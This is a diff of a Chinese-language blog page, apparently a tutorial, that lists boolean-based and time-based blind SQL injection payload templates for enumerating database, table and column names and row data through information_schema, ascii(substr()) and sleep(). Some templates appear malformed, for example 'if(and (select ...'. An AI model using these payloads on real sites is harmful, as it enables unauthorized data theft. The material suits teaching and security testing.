@@ -48,42 +48,42 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></he
         <h2 id="一：对数据库的猜解">
           <a href="#一：对数据库的猜解" class="heading-link"><i class="fas fa-link"></i></a><a href="#一：对数据库的猜解" class="headerlink" title="一：对数据库的猜解"></a>一：对数据库的猜解</h2>
       <p>(1).<br>猜解数据库长度：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and length(database())=x<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and length(database())=x</span><br></pre></td></tr></table></div></figure>
 <p>此时的x为数据库长度，此处的=可以换成&gt;来缩小检索范围。<br>(2).<br>使用ASCII猜解数据库名</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and (ascii(substr(database(),m,n)))=x<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr(database(),m,n)))=x</span><br></pre></td></tr></table></div></figure>
 <p>m为数据库名字的第m个字符,n为从第m个字符起一共读取n个字符，此处的x为ascii值</p>
 <hr>
 
         <h2 id="二：对数据表的猜解">
           <a href="#二：对数据表的猜解" class="heading-link"><i class="fas fa-link"></i></a><a href="#二：对数据表的猜解" class="headerlink" title="二：对数据表的猜解"></a>二：对数据表的猜解</h2>
       <p>(1).<br>猜解数据表的个数</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and (select count(table_name) from information_schema.tables where table_schema=database()) = x<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(table_name) from information_schema.tables where table_schema=database()) = x</span><br></pre></td></tr></table></div></figure>
 <p>x为数据表的个数<br>(2).<br>猜解表名的长度</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and length((select table_name from information_schema.tables where table_schema=database() limit m,n)) = x<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and length((select table_name from information_schema.tables where table_schema=database() limit m,n)) = x</span><br></pre></td></tr></table></div></figure>
 <p>此处的m表示从m+1个表开始读取,n表示只读取n+1个表，x表示表的长度<br>(3).<br>使用ASCII猜解表名</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit m,n),x,y)))<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit m,n),x,y)))</span><br></pre></td></tr></table></div></figure>
 <p>此处的m表示从第m+1个表开始读取，n表示只读取几个表；x为第几位字符；y:从第x位开始截取的字符长度为y</p>
 <hr>
 
         <h2 id="三-对列名的猜解">
           <a href="#三-对列名的猜解" class="heading-link"><i class="fas fa-link"></i></a><a href="#三-对列名的猜解" class="headerlink" title="三:对列名的猜解"></a>三:对列名的猜解</h2>
       <p>(1).<br>猜取列名的个数</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and (select count(column_name) from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;) = x<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(column_name) from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;) = x</span><br></pre></td></tr></table></div></figure>
 <p>x为列名的数量<br>(2).<br>猜取列名的长度</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and length((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit m,n)) = x<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and length((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit m,n)) = x</span><br></pre></td></tr></table></div></figure>
 <p>m为从第m个列名开始读取，n为只读几个列名，x为列名的长度<br>(3).<br>猜取列名</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and ascii(substr((select column_name from information_schema.columns where table_name = &#x27;表名&#x27; and table_schema = &#x27;数据库名&#x27; limit m,n),x,y))=i<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select column_name from information_schema.columns where table_name = &#x27;表名&#x27; and table_schema = &#x27;数据库名&#x27; limit m,n),x,y))=i</span><br></pre></td></tr></table></div></figure>
 <p>m为从第m个列名开始读取，n为只读取n个列名，x为第几位字符，y:从第x位开始共有几位字符</p>
 <hr>
 
         <h2 id="四：对于数据的猜取">
           <a href="#四：对于数据的猜取" class="heading-link"><i class="fas fa-link"></i></a><a href="#四：对于数据的猜取" class="headerlink" title="四：对于数据的猜取"></a>四：对于数据的猜取</h2>
       <p>(1).<br>猜取数据的个数</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and (select count(*) from 表名)=x<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from 表名)=x</span><br></pre></td></tr></table></div></figure>
 <p>x为数据的条数或者叫做列数<br>(2).<br>猜取数据的长度</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and length((select 列名 from 表名 limit m,n))=x<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and length((select 列名 from 表名 limit m,n))=x</span><br></pre></td></tr></table></div></figure>
 <p>m为第几条数据，n为从m开始一共有几条数据<br>(3).<br>猜取数据的内容</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and ascii(substr((select 列名 from 表名 limit m,n),i,j))=x<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select 列名 from 表名 limit m,n),i,j))=x</span><br></pre></td></tr></table></div></figure>
 <p>m为第几条数据，n为从m开始一共读取n条数据；i为该数据的第i位字符，j为从第i位开始一共读取j个字符；x为该字符的ascii值</p>
 <hr>
 
@@ -97,49 +97,49 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></he
 <p>思路：数量&gt;长度&gt;具体<br>获取数据库名字的长度<br>获取数据库的名字<br>获取数据表的个数<br>获取数据表名字的长度<br>获取数据表名字<br>获取列的个数<br>获取列的长度<br>获取列的具体名字<br>获取数据的列数<br>获取数据的长度<br>获取具体的数据</p>
 <hr>
 <p>在开始进行注入前我们先对此进行一个验证</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and sleep(10)<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and sleep(10)</span><br></pre></td></tr></table></div></figure>
 <p><img src="/2022/11/16/%E7%9B%B2%E6%B3%A8/1.png"><br><img src="/2022/11/16/%E7%9B%B2%E6%B3%A8/2.png"><br>此时发现确实是延迟了；所以我们便可以开始了</p>
 <hr>
 
         <h2 id="一：对数据库的猜解-1">
           <a href="#一：对数据库的猜解-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#一：对数据库的猜解-1" class="headerlink" title="一：对数据库的猜解"></a>一：对数据库的猜解</h2>
       <p>(1)<br>猜解数据库名称的长度</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and if(length(database()=x),sleep(y),0)<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length(database()=x),sleep(y),0)</span><br></pre></td></tr></table></div></figure>
 <p>x为数据库的长度；y是你需要延迟的时间<br>(2)<br>猜解数据库的名称</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and if(ascii(substr(database(),x,y))=m,sleep(n),0)<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(substr(database(),x,y))=m,sleep(n),0)</span><br></pre></td></tr></table></div></figure>
 <p>x为数据库名称的第几位，y是从x位开始一共截取的位数；m为ascii值，n为延迟的时间</p>
 <hr>
 
         <h2 id="二：对数据表的猜解-1">
           <a href="#二：对数据表的猜解-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#二：对数据表的猜解-1" class="headerlink" title="二：对数据表的猜解"></a>二：对数据表的猜解</h2>
       <p>(1)<br>猜解数据表的个数</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and if((select count(table_name) from information_schema.tables where table_schema=database()) = x,sleep(y),0)<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select count(table_name) from information_schema.tables where table_schema=database()) = x,sleep(y),0)</span><br></pre></td></tr></table></div></figure>
 <p>x为数据表的个数，y为延迟的时间<br>(2)<br>猜解数据表的长度</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and if(length((select table_name from information_schema.tables where table_schema=database() limit m,n)) = x,sleep(y),0)<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length((select table_name from information_schema.tables where table_schema=database() limit m,n)) = x,sleep(y),0)</span><br></pre></td></tr></table></div></figure>
 <p>m为第从m+1个表开始读取；n为一共读取几个表；x为该表的长度；y为延迟的时间<br>(3)<br>猜解数据表的名称</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit m,n),x,y))),sleep(i),0)<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit m,n),x,y))),sleep(i),0)</span><br></pre></td></tr></table></div></figure>
 <p>m为从第m+1个表开始读取，n为一共读取几个表；x为表的第几个字符，y为从x字符开始，一共读取几个字符；i为<br>延迟时间</p>
 <hr>
 
         <h2 id="三：对列名的猜取">
           <a href="#三：对列名的猜取" class="heading-link"><i class="fas fa-link"></i></a><a href="#三：对列名的猜取" class="headerlink" title="三：对列名的猜取"></a>三：对列名的猜取</h2>
       <p>(1)<br>猜取列名的个数</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and if(and (select count(column_name) from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;) = x,sleep(y),0)<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(and (select count(column_name) from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;) = x,sleep(y),0)</span><br></pre></td></tr></table></div></figure>
 <p>x为列名的个数，y为延迟的时间<br>(2)<br>猜取列名的长度</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and if(and length((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit m,n)) = x,sleep(y),0)<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(and length((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit m,n)) = x,sleep(y),0)</span><br></pre></td></tr></table></div></figure>
 <p>m为第m+1个列名，n为一共读取几个列名；x为该列名的长度，y为延迟的时间<br>(3)<br>猜取列名</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and if(and ascii(substr((select column_name from information_schema.columns where table_name = &#x27;表名&#x27; and table_schema = &#x27;数据库名&#x27; limit m,n),x,y))=i,sleep(j),0)<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(and ascii(substr((select column_name from information_schema.columns where table_name = &#x27;表名&#x27; and table_schema = &#x27;数据库名&#x27; limit m,n),x,y))=i,sleep(j),0)</span><br></pre></td></tr></table></div></figure>
 <p>m为从第几个列名开始，n为一共读取几个列名；x为该列名的第x个字符，y为从第x个字符开始，一共读取y个字符，i为该字符的ascii值；j为延迟的时间</p>
 <hr>
 
         <h2 id="四：猜解数据">
           <a href="#四：猜解数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#四：猜解数据" class="headerlink" title="四：猜解数据"></a>四：猜解数据</h2>
       <p>(1)<br>猜解数据的个数</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and if((select count(*) from 表名)=x,sleep(y),0)<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select count(*) from 表名)=x,sleep(y),0)</span><br></pre></td></tr></table></div></figure>
 <p>x为数据的条数，y为延迟的时间<br>(2)<br>猜解数据的长度</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and if(and length((select 列名 from 表名 limit m,n))=x,sleep(y),0)<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(and length((select 列名 from 表名 limit m,n))=x,sleep(y),0)</span><br></pre></td></tr></table></div></figure>
 <p>m为第几条数据，n为从m开始，一共有几条数据；x为该数据的长度，y为延迟的时间<br>(3)<br>猜解数据</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and if(ascii(substr((select 列名 from 表名 limit m,n),i,j))=x,sleep(y),0)<br></code></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(substr((select 列名 from 表名 limit m,n),i,j))=x,sleep(y),0)</span><br></pre></td></tr></table></div></figure>
 <p>m为第几条数据，n为从m开始一共读取n条数据；i为该数据的第i位字符，j为从第i位开始一共读取j个字符；x为该字符的ascii值，y为延迟的时间</p>
 <hr>
 
